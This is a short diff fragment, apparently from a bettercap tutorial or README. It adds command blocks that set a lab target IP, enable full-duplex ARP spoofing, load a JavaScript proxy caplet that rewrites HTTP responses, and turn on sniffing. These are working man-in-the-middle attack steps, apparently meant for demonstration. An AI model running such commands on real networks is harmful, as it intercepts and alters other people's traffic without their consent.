@@ -75,7 +75,16 @@ http.on('response', function(req, res) {
 
 ```
 set net.target 192.168.226.138
-set http.proxy.caplet title_replace.cap
+set http.proxy.caplet title_replace.js
+arp.spoof on
+http.proxy on
+net.sniff on
+```
+
+```
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.226.138
+set http.proxy.caplet title_replace.js
 arp.spoof on
 http.proxy on
 net.sniff on
